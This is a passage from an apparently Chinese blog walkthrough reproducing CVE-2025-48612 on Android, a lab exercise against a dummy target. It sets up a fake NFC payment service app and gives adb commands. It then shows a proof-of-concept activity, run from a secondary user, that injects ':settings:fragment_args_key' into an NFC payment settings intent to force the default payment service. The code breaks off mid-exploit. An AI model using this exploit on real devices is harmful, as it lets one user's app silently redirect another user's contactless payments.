<span class="line"><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">nfc</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">cardemulation</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">H</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">ost</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">A</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">pdu</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">S</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">ervice</span></span>
<span class="line"><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">os</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">B</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">undle</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">class</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic"> M</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">y</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">H</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">ost</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">A</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">pdu</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">S</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">ervice : </span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">H</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">ost</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">A</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">pdu</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">S</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">ervice</span><span style="color:#2993a3;--shiki-dark:#5eaab5">(</span><span style="color:#2993a3;--shiki-dark:#5eaab5">)</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">{</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">    // 当 NFC 读卡器发送指令时调用</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">    override fun process</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">C</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">ommand</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">A</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">pdu</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">command</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">A</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">pdu: </span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">B</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">yte</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">A</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">rray?, extras: </span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">B</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">undle?</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">: </span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">B</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">yte</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">A</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">rray </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // 我们不需要真的处理支付，直接返回空字节数组即可</span></span>
<span class="line"><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">        return</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic"> B</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">yte</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">A</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">rray</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">0</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">    </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">    // 当连接断开时调用</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">    override fun on</span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">D</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">eactivated</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">reason: </span><span style="color:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic">I</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">nt</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // 什么都不用做</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">    </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"><span style="color:#2993a3;--shiki-dark:#5eaab5">}</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260121164624068.png" alt="image-20260121164624068"></p>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260121164822079.png" alt="image-20260121164822079"></p>
<h4 id="15-编译安装"><a class="anchor" href="#15-编译安装">#</a> 1.5 编译安装</h4>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260121170606337.png" alt="image-20260121170606337"></p>
<p>必须安装在主用户（User 0）上：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>adb install --user 0 TargetAPP.apk</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260121170614858.png" alt="image-20260121170614858"></p>
<p>安装后，验证一下系统是否识别到了它：</p>
<ol>
<li>进入手机 <strong>设置 -&gt; 连接设备 -&gt; 连接偏好设置 -&gt; NFC -&gt; 感应式付款</strong>。</li>
<li>你应该能看到 "Target Pay" 出现在列表里。</li>
<li><strong>不要手动选它</strong>（或者手动选其他的，保持它是未选中状态，用来测试漏洞能否强制选中它）。</li>
</ol>
<p>&lt;img src="<a target="_blank" rel="noopener" href="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/Screenshot_20250402-050025%5B1%5D.png">https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/Screenshot_20250402-050025[1].png</a>" alt="img" style="zoom: 25%;" /&gt;</p>
<p>如果系统认为 TargetApp 不是一个有效的支付服务，它可能会在最后一刻拒绝设置。检查 User 0 上的 TargetApp 是否被系统正确识别：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 强制 User 0 刷新 NFC 服务缓存</span></span>
<span class="line"><span>adb shell am broadcast -a android.intent.action.BOOT_COMPLETED -p com.android.nfc</span></span>
<span class="line"><span></span></span>
<span class="line"><span># 查看 NFC 服务识别到的支付服务列表</span></span>
<span class="line"><span> adb shell dumpsys nfc | grep -E "targetapp"</span></span></code></pre>
<p>搜索 <code>com.example.targetapp</code>出现：说明“靶子”是好的</p>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260121195850573.png" alt="image-20260121195850573"></p>
<p>测试一下：在NFC默认支付选择<code>无</code>时：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>adb shell dumpsys nfc | grep "Current wallet payment service"</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260121203329795.png" alt="image-20260121203329795"></p>
<p>选择<code>targetpay</code></p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>adb shell dumpsys nfc | grep "Current wallet payment service"</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260121203415911.png" alt="image-20260121203415911"></p>
<h3 id="2安装攻击应用"><a class="anchor" href="#2安装攻击应用">#</a> 2.安装攻击应用</h3>
<p>需要将编译好的 PoC 应用安装到非<strong>User 0</strong> 用户，以前创建了User10用户</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-shell"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> pm</span><span style="color:#B56959;--shiki-dark:#C98A7D"> list</span><span style="color:#B56959;--shiki-dark:#C98A7D"> users</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260121171312933.png" alt="image-20260121171312933"></p>
<p>切换到User 10</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-shell"><span class="line"><span style="color:#59873A;--shiki-dark:#80A665">adb</span><span style="color:#B56959;--shiki-dark:#C98A7D"> shell</span><span style="color:#B56959;--shiki-dark:#C98A7D"> am</span><span style="color:#B56959;--shiki-dark:#C98A7D"> switch-user</span><span style="color:#2F798A;--shiki-dark:#4C9A91"> 10</span></span></code></pre>
<h4 id="21mainactivityjava-中编写如下代码"><a class="anchor" href="#21mainactivityjava-中编写如下代码">#</a> 2.1<code>MainActivity.java</code> 中编写如下代码</h4>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-java"><span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">package</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> com</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">example</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">cve_2025_48612</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">app</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Activity</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">content</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">ComponentName</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">content</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Intent</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">os</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Bundle</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">util</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Log</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">import</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> android</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">widget</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Toast</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">public</span><span style="color:#AB5959;--shiki-dark:#CB7676"> class</span><span style="color:#2E8F82;--shiki-dark:#5DA994"> MainActivity</span><span style="color:#AB5959;--shiki-dark:#CB7676"> extends</span><span style="color:#59873A;--shiki-dark:#80A665"> Activity</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#2993a3;--shiki-dark:#5eaab5">{</span></span>
<span class="line"></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    @</span><span style="color:#AB5959;--shiki-dark:#CB7676">Override</span></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    protected</span><span style="color:#AB5959;--shiki-dark:#CB7676"> void</span><span style="color:#59873A;--shiki-dark:#80A665"> onCreate</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Bundle </span><span style="color:#B07D48;--shiki-dark:#BD976A">savedInstanceState</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#A65E2B;--shiki-dark:#C99076">        super</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">onCreate</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">savedInstanceState</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">        // 执行攻击</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">        exploit</span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#AB5959;--shiki-dark:#CB7676">    private</span><span style="color:#AB5959;--shiki-dark:#CB7676"> void</span><span style="color:#59873A;--shiki-dark:#80A665"> exploit</span><span style="color:#1e754f;--shiki-dark:#4d9375">(</span><span style="color:#1e754f;--shiki-dark:#4d9375">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#1e754f;--shiki-dark:#4d9375">{</span></span>
<span class="line"><span style="color:#1E754F;--shiki-dark:#4D9375">        try</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">{</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">            // 1. 目标组件信息 (保持不变)</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            String</span><span style="color:#B07D48;--shiki-dark:#BD976A"> targetPackage</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">com.example.targetapp</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            String</span><span style="color:#B07D48;--shiki-dark:#BD976A"> targetClass</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">com.example.targetapp.MyHostApduService</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">            // 2. 构造 Payload (保持不变)</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">            // 确保格式正确: "包名/类名 UserID"</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">            // 注意: 你的日志里显示 Payload 是 "com.example.targetapp/com.example.targetapp.MyHostApduService 0"</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">            // 这是一个正确的 ComponentName 格式</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            String</span><span style="color:#B07D48;--shiki-dark:#BD976A"> maliciousKey</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> targetPackage </span><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">/</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#AB5959;--shiki-dark:#CB7676"> +</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> targetClass </span><span style="color:#AB5959;--shiki-dark:#CB7676">+</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D"> 0</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            Log</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">d</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">POC</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">Payload Key: </span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#AB5959;--shiki-dark:#CB7676"> +</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> maliciousKey</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">            // 3. 构建 Intent - 使用公开 Action (关键修改!)</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">            // 这是一个系统必须响应的 Action，因此对应的 Activity 必然是 exported 的</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            Intent</span><span style="color:#B07D48;--shiki-dark:#BD976A"> intent</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#1E754F;--shiki-dark:#4D9375"> new</span><span style="color:#59873A;--shiki-dark:#80A665"> Intent</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">android.settings.NFC_PAYMENT_SETTINGS</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">            // 4. 注入参数 (漏洞利用点)</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">            // 即使是通过 Action 启动，Android Settings 通常也会将 Intent 的 Extras 传递给 Fragment</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            intent</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">putExtra</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">:settings:fragment_args_key</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> maliciousKey</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">            // 双重保险：有些 Settings 版本需要放在 Bundle 里</span></span>
<span class="line"><span style="color:#393A34;--shiki-dark:#DBD7CAEE">            Bundle</span><span style="color:#B07D48;--shiki-dark:#BD976A"> args</span><span style="color:#999999;--shiki-dark:#666666"> =</span><span style="color:#1E754F;--shiki-dark:#4D9375"> new</span><span style="color:#59873A;--shiki-dark:#80A665"> Bundle</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            args</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">putString</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">:settings:fragment_args_key</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> maliciousKey</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            intent</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">putExtra</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">:settings:show_fragment_args</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> args</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">            // 5. 设置 Flags (跨用户启动必须)</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            intent</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">addFlags</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">Intent</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">FLAG_ACTIVITY_NEW_TASK</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            intent</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">addFlags</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#B07D48;--shiki-dark:#BD976A">Intent</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#B07D48;--shiki-dark:#BD976A">FLAG_ACTIVITY_CLEAR_TOP</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">            // 6. 发射</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            Log</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">d</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">POC</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">Sending exploit intent via NFC_PAYMENT_SETTINGS Action...</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#80A665">            startActivity</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">intent</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            Log</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">i</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">POC</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">Exploit Intent Sent Successfully!</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"></span>
